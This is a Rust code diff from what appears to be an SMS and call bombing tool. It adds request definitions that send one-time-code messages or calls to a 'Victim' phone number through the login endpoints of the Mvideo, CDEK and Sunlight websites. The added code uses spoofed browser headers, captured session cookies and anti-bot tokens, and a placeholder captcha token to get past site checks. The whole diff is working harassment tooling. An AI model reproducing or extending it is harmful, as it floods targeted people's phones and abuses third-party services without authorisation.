@@ -1,8 +1,4 @@
-use crate::phone::{
-    Country,
-    FormatterTypes::{WithPlus, WithPlusBracketsHyphen, WithPlusHyphen},
-    Phone,
-};
+use crate::phone::{Country, FormatterTypes::WithPlus, Phone};
 use reqwest::header::HeaderMap;
 use reqwest::Method;
 use serde_json::json;
@@ -25,12 +21,14 @@ pub enum ServiceType {
     ServiceSms,
 }
 
+#[allow(clippy::upper_case_acronyms)]
 #[derive(Debug, Clone)]
 pub enum BodyType {
     JSON,
     Form,
 }
 
+#[allow(dead_code)]
 #[derive(Debug, Clone)]
 pub struct Victim {
     pub phone: Phone,
@@ -130,6 +128,234 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     "FastAuthorizationLoginLoadForm[login]": phone.phone,
                     "FastAuthorizationLoginLoadForm[token]" : "",
                     "FastAuthorizationLoginLoadForm[isPhoneCall]": 1
+                });
+
+                services.push(service);
+            }
+            // Mvideo
+            {
+                let mut service = Service {
+                    name: "Mvideo".to_string(),
+                    service_type: ServiceType::Sms,
+                    method: Method::POST,
+                    url: "https://www.mvideo.ru/bff/auth/login-step-1".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::JSON,
+                    body: Default::default(),
+                };
+
+                service.headers.insert(
+                    "User-Agent",
+                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Accept", r#"application/json"#.parse().unwrap());
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
+                service.headers.insert(
+                    "x-set-application-id",
+                    r#"ef24eb29-42b2-4ef4-8f6f-3ad5033d0a6a"#.parse().unwrap(),
+                );
+                service.headers.insert("X-GIB-GSSCgib-w-mvideo", r#"snXsuoSjjiFKPTVzRAlZ5VWUrp5jucLvMddFAa9Va/1yc22FV2udhJ3o2hy9crWyNy/BxCS9jkDibVS1Wzs0OUl5z6N8PGYa9rrckT91Y20V9XV0NCy0NdPRIuNYrLBLUJidHC+GS3qUv1kLVJ/EMyNGYzZDWPP5ntgqTnD8b80aCLRah5ffuxw4/AobjnshxWD9yy9qkmvJ2i3acA3o9vV/3fA8j5UkgAAkPUM2/MMGWolLLoEfeFlEXxvkiT3z+jLuru2k"#.parse().unwrap());
+                service.headers.insert(
+                    "X-GIB-FGSSCgib-w-mvideo",
+                    r#"syzfa9eb36b6d5cbe0ea8120b2e3b71e2efde782"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "sentry-trace",
+                    r#"5207ca627ee64776bd9ac08514f88242-8497480eac35c1d7-0"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert("baggage", r#"sentry-environment=production,sentry-release=release_24_8_1(8394),sentry-public_key=ae7d267743424249bfeeaa2e347f4260,sentry-trace_id=5207ca627ee64776bd9ac08514f88242,sentry-sample_rate=0.1,sentry-transaction=%2F,sentry-sampled=false"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Origin", r#"https://www.mvideo.ru"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Referer", r#"https://www.mvideo.ru/"#.parse().unwrap());
+                service.headers.insert("Cookie", r#"__hash_=4dccae4003b911a9277ae8245e017327; __lhash_=88ca3741bfaa20eeba582564f0f5dc56; MVID_AB_PERSONAL_RECOMMENDS=true; MVID_AB_PERSONAL_RECOMMENDS_SRP=true; MVID_AB_UPSALE=true; MVID_ACCESSORIES_ORDER_SET_VERSION=2; MVID_ACCESSORIES_PDP_BY_RANK=true; MVID_BR_CONVERSION=true; MVID_CASCADE_CMN=true; MVID_CHAT_VERSION=6.6.0; MVID_CITY_ID=CityCZ_2128; MVID_CREDIT_DIGITAL=true; MVID_CREDIT_SERVICES=true; MVID_CRITICAL_GTM_INIT_DELAY=3000; MVID_DIGINETICA_ENABLED=true; MVID_DISABLEDITEM_PRICE=true; MVID_DISPLAY_ACCRUED_BR=true; MVID_DISPLAY_PERS_DISCOUNT=true; MVID_EMPLOYEE_DISCOUNT=true; MVID_FILTER_CODES=true; MVID_FLOCKTORY_ON=true; MVID_GEOLOCATION_NEEDED=true; MVID_GROUP_BY_QUALITY=true; MVID_GTM_ENABLED=011; MVID_IMG_RESIZE=true; MVID_IS_NEW_BR_WIDGET=true; MVID_KLADR_ID=2300000100000; MVID_MULTIOFFER=true; MVID_NEW_CHAT_PDP=true; MVID_NEW_LK_CHECK_CAPTCHA=true; MVID_NEW_LK_OTP_TIMER=true; MVID_NEW_PATCH_SHOPPING_CART_GUID_DETAILS_ACTIVITY=true; MVID_NEW_PATCH_SHOPPING_CART_GUID_IDENTITY=true; MVID_NEW_POST_SHOPPING_CART_GUID_ITEMS_DELETE=true; MVID_REGION_ID=11; MVID_REGION_SHOP=S911; MVID_SERVICES=111; MVID_SERVICE_AVLB=true; MVID_SP=true; MVID_TIMEZONE_OFFSET=3; MVID_TYP_CHAT=true; MVID_WEB_SBP=true; SENTRY_ERRORS_RATE=0.1; SENTRY_REPLAYS_ERRORS_RATE=0.01; SENTRY_REPLAYS_SESSIONS_RATE=0.01; SENTRY_TRANSACTIONS_RATE=0.1; MVID_ENVCLOUD=prod2; cfidsgib-w-mvideo=I4VhLBPFjyYb5aZRce+8rTFj+Yhc2zDY8U6UuxHNKsUbqHdsIarIrn+EmGPuTyxqcD5U+bzgMpxizak+b4OeUq1GyTObwaVyW6LQnezWY6J5e2REWWzRx6mDGawbkCYn9vdlEUYairui/lLYg/PKbsMC2NTlVL5kckDu; gsscgib-w-mvideo=snXsuoSjjiFKPTVzRAlZ5VWUrp5jucLvMddFAa9Va/1yc22FV2udhJ3o2hy9crWyNy/BxCS9jkDibVS1Wzs0OUl5z6N8PGYa9rrckT91Y20V9XV0NCy0NdPRIuNYrLBLUJidHC+GS3qUv1kLVJ/EMyNGYzZDWPP5ntgqTnD8b80aCLRah5ffuxw4/AobjnshxWD9yy9qkmvJ2i3acA3o9vV/3fA8j5UkgAAkPUM2/MMGWolLLoEfeFlEXxvkiT3z+jLuru2k; fgsscgib-w-mvideo=syzfa9eb36b6d5cbe0ea8120b2e3b71e2efde782; fgsscgib-w-mvideo=syzfa9eb36b6d5cbe0ea8120b2e3b71e2efde782; _userGUID=0:lzli6o73:6Jr6SUWfwcF27ck5Rk3wQ~Ek8bNBmLSf; mindboxDeviceUUID=db26e639-887a-4a4f-b78c-f505b0fa19dc; directCrm-session=%7B%22deviceGuid%22%3A%22db26e639-887a-4a4f-b78c-f505b0fa19dc%22%7D; dSesn=4c73badc-90d8-9fa5-76cb-5e762a7622e4; _dvs=0:lzli6o73:EY7GgmPIj0kCSVd7Lsq5pOj7d0aVtWZS; _ga_CFMZTSS5FM=GS1.1.1723135163.1.0.1723135163.0.0.0; _ga=GA1.1.859026648.1723135163; _ga_BNX5WPP3YK=GS1.1.1723135163.1.0.1723135163.60.0.0; _sp_ses.d61c=*; _sp_id.d61c=837f52ed-2037-4f1c-ade5-078c7957c986.1723135164.1.1723135166..a02c9f97-92df-4d1e-b009-04ca682ffbae..b1c1e752-f061-4bce-8ebf-dc9ae7938534.1723135163630.19; gsscgib-w-mvideo=snXsuoSjjiFKPTVzRAlZ5VWUrp5jucLvMddFAa9Va/1yc22FV2udhJ3o2hy9crWyNy/BxCS9jkDibVS1Wzs0OUl5z6N8PGYa9rrckT91Y20V9XV0NCy0NdPRIuNYrLBLUJidHC+GS3qUv1kLVJ/EMyNGYzZDWPP5ntgqTnD8b80aCLRah5ffuxw4/AobjnshxWD9yy9qkmvJ2i3acA3o9vV/3fA8j5UkgAAkPUM2/MMGWolLLoEfeFlEXxvkiT3z+jLuru2k; gsscgib-w-mvideo=snXsuoSjjiFKPTVzRAlZ5VWUrp5jucLvMddFAa9Va/1yc22FV2udhJ3o2hy9crWyNy/BxCS9jkDibVS1Wzs0OUl5z6N8PGYa9rrckT91Y20V9XV0NCy0NdPRIuNYrLBLUJidHC+GS3qUv1kLVJ/EMyNGYzZDWPP5ntgqTnD8b80aCLRah5ffuxw4/AobjnshxWD9yy9qkmvJ2i3acA3o9vV/3fA8j5UkgAAkPUM2/MMGWolLLoEfeFlEXxvkiT3z+jLuru2k; _ym_uid=1723135164684877333; _ym_d=1723135164; _ym_isad=2; _ym_visorc=w; __SourceTracker=google__organic; admitad_deduplication_cookie=google__organic; SMSError=; authError=; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=716d5d1a-0719-4316-9686-3ac4560d7b02; advcake_track_id=feb415f1-9815-e908-7149-5c6421c9402e; advcake_session_id=787a6cdc-7d92-fbba-c3d5-1da5881815ea; flocktory-uuid=84a7d1ec-1011-4ecf-a3bc-964d4fbbd452-5; uxs_uid=c713dd20-55a4-11ef-97c6-a71198f127bb; advcake_track_url=%3D20240805CsxSI1gOEl8Nn0H6ZFnpf8JbhBK3zAbXNkhUcububbMBaXY%2F9oIi8dWI%2B2dCCf1QkAiXKMUB7MAFmy0ywc3Ui%2FZH5pyhWQB2z9MnqT28%2B9CRB2dnAa4N6cN%2F%2B8Bq%2BzneGs9l%2Brb5NIm%2BFE9YTKMnWSHvOTXL3UCSdjByFK25kuHl6McTG0XmQf%2B0V%2F%2Fwn%2BuOUrgSVsePQKk67%2BJQ74AdN%2F%2F5BEAzK76tEBlQHzvZFF1tnXN%2FK8uG1YYrOwgktF4i2z4cIgzTA%2F8rUIs1UE7ZIVqHF0RXZ7MbtwqI9EzoTFSPdmzrMcbEAIW4DC6x4NQ51EVu6zlJQhbT2mWRhLtYcPc8UTwzbKRFzEYYbUybnkm8oQ3geBeXdK3aDdfMf0mUb2roIvslgKkCBPBLOUn5yMv3ST0weW5ZgyP5MIAuFvsMyYtcwF5%2BGGCrIJ7WTtdqPIjtPSDW6PSYOVQmbF04k4RsHS2OMYiRK6GBE0UtieHlkrk4ezovp17frznD979tVwrTfwdlixnoO0CJUahy2dqaJYj2gP1dEc4g9zNUn4ySpr37c5swL6KAMCFTPtdlLAc3WiTrrElm7npYecTNEd7JT39y9GSz7%2Fyln1Z2CabqbncIOaLZzowK88kdP6tI704Kc1zhnIoFCCXIXddedjWuQwAZaKaqgdrY0i8F2RFwFJM3mt2Ac9Q%3D; flacktory=no; BIGipServeratg-ps-prod_tcp80=2416237578.20480.0000; bIPs=1949759381; tmr_lvid=544a75f2cc463ca387d29734580db36b; tmr_lvidTS=1723135170271; domain_sid=QeGVvxs5CooUo9zLDE95y%3A1723135171327; afUserId=d8a70f82-a6ef-4d79-9d8f-31694b6e8283-p; AF_SYNC=1723135172269; adrdel=1723135172355; adrdel=1723135172355; adrcid=Ak4xeXjMzBPWwVw3LLLzeFg; adrcid=Ak4xeXjMzBPWwVw3LLLzeFg; tmr_detect=0%7C1723135172815"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Priority", r#"u=0"#.parse().unwrap());
+                service.headers.insert("TE", r#"trailers"#.parse().unwrap());
+
+                let mut phone = victim.phone.clone();
+                phone.format(WithPlus);
+                service.body = json!({
+                    "phoneNumber": phone.phone,
+                    "token": "nocaptchatoken",
+                    "sendBy": "CASCADE",
+                    "action": "SENT_PIN_CODE"
+                });
+
+                services.push(service);
+            }
+            // CDEK
+            {
+                let mut service = Service {
+                    name: "CDEK".to_string(),
+                    service_type: ServiceType::Sms,
+                    method: Method::POST,
+                    url: "https://www.cdek.ru/api-site/auth/send-code/".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::JSON,
+                    body: Default::default(),
+                };
+
+                service
+                    .headers
+                    .insert("Host", r#"www.cdek.ru"#.parse().unwrap());
+                service.headers.insert(
+                    "User-Agent",
+                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Accept", r#"application/json"#.parse().unwrap());
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Origin", r#"https://www.cdek.ru"#.parse().unwrap());
+                service.headers.insert("DNT", r#"1"#.parse().unwrap());
+                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service.headers.insert(
+                    "Referer",
+                    r#"https://www.cdek.ru/ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert("Cookie", r#"qrator_jsr=v2.0.1725453696.816.5db9c67c9BA4mON6|wDhYa3zodgygc0VC|HPwsvW9Zuv1XfCTjvV4tOWRTid+B/ueiRN0EgCam/CHTpFE4F0yTC8XPiudRXVSm4ORlmY50slwKLtAp1E5CKQA5olwrAhCr9FEI6vtV52o=-AbEZ5HAjGZF97yfQPTUx5bcyS7g=-00; qrator_jsid2=v2.0.1725453696.816.5db9c67c9BA4mON6|zSGcWWCA9EQz5GL6|nApVRY7ukbEXgupPcTFQ+GTJlCMZC2VjqrBRV0RitGnPYCHxFbSdSYke3e66Tq0kyxo6cKqU0Qox4xhaJ43bcHK99Imhepi40tIOA+qSgqMNAAmdO39S752QMJFugMx+2+2pcvWJ6E1P/FtKWTQ42w==-DgUM8iSbc2kCmEpwxWOGRqDq4eU=; cdek-stick=1725453698.852.1097792.944145|4d286599a6e893574f6bcc8bc0b1b325; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-04%2015%3A41%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F%3Futm_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-04%2015%3A41%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F%3Futm_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%3B%20rv%3A129.0%29%20Gecko%2F20100101%20Firefox%2F129.0; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F%3Futm_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F; cpss=eyJ0b2tlbiI6InBoaWVZaWFzaDNpUnUzYWgifQ%3D%3D; advcake_track_id=5f4de0a0-2094-c568-fc22-93d9f4a0ec55; advcake_session_id=f0fd745c-81ed-ab5e-dced-c802b2c3f81c; cityid=1095; flomni_5d713233e8bc9e000b3ebfd2={%22userHash%22:%2207e1e570-c44c-4dae-95ad-345ec15c138c%22}; advcake_track_url=%3D20240902HkU1OkM3cOcCDZXujDrn9yl7qqKKSZy53mBDf9HsdF9D7G7%2BPVEhFmAeB%2B5dJ9O%2F90Omkr%2Brs%2FlkV9P89Bwk8DyzSD0Bgnos%2BE9eREMKdrcnYDp0CXowZBtN8GUs9Hu%2F9QQzc20jZS%2B1FGFGjxRN7JqsMGzIq%2Bqe8B7Mj8rRRx%2FeMoM6Skh2Xr3nMauaGZ1AFSct7KvIFvGHxs49otWCxsISL0YzRYx%2Br7ddCaenntt21j9RH9ah4k1Qp1rqaCvXd6peIicu7nntoIoC26610Ed8jIdfQ5Y%2BYPt3KYDM7CKqfJf8NJnYVul4MHFzCb4xJxstXjj%2FM5LaXjKswS2Mdw71E189tQjil%2B00TuJ2VNVBIrbuoIfCkSNwDg5CnVJ6pQzXuP%2BLP1I1EWxN3cLZu3LYOP94yRP57pgp8pAfwtjmZ%2FWdNIidwUbnM%2BlXaXLeeo21OafI5wYgsJCG7fL1bP2dNbn56gWXhqi1x92zk51BVZmgANkxOsJeh2CM0vS5CLoBN4kCwU0u2QeGt0uR6LJxULOrf%2B8pkfbYWXXOVrQar2M2nUZyft54AhGeJEVD357eRj83i3ezxhHu4ahS43bbzz71BgWVNaEzJVfIi8otc2pAJE3kCuP2wPmVkggqU6vwCdKpxseBu33gIhU5%2BVzAosR5xWxdCrf9i4aSxkBXynY2b1zoT2o%3D"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("host", r#"www.cdek.ru"#.parse().unwrap());
+
+                let mut phone = victim.phone.clone();
+                phone.format(WithPlus);
+                service.body = json!({
+                    "locale": "ru",
+                    "websiteId": "ru",
+                    "phone": phone.phone,
+                    "token": null
+                });
+
+                services.push(service);
+            }
+            // Sunlight
+            {
+                let mut service = Service {
+                    name: "Sunlight".to_string(),
+                    service_type: ServiceType::Call,
+                    method: Method::POST,
+                    url: "https://api.sunlight.net/modules/customer-auth/v1/web/send/".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::JSON,
+                    body: Default::default(),
+                };
+
+                service.headers.insert(
+                    "User-Agent",
+                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert(
+                    "Accept",
+                    r#"application/json, text/javascript, */*; q=0.01"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
+                service.headers.insert(
+                    "User-Local-Time",
+                    r#"2024-08-18T13:49:28.279Z"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Customer-Source",
+                    r#"612f086bcbbe9407b1b104984d8bd66db1ca36da697d1a960d5f2ac5cc719156"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Origin", r#"https://sunlight.net"#.parse().unwrap());
+                service.headers.insert("DNT", r#"1"#.parse().unwrap());
+                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service.headers.insert("Cookie", r#"city_auto_popup_shown=1; city_id=149; city_name=%D0%A0%D0%B0%D0%BC%D0%B5%D0%BD%D1%81%D0%BA%D0%BE%D0%B5; city_full_name=%D0%A0%D0%B0%D0%BC%D0%B5%D0%BD%D1%81%D0%BA%D0%BE%D0%B5%2C%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB; region_id=bd3d9701-eb48-4739-adb9-ba3536191ca3; region_name=%D0%A0%D0%B0%D0%BC%D0%B5%D0%BD%D1%81%D0%BA%D0%BE%D0%B5; region_subdomain=""; cart=on; seo_campaign=b19ea3b5-1a6f-4eb5-9486-45946be9e03f"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-site"#.parse().unwrap());
+
+                let mut phone = victim.phone.clone();
+                phone.format(WithPlus);
+                service.body = json!({
+                    "phone": phone.phone,
+                    "source": "web_auth_page"
                 });
 
                 services.push(service);
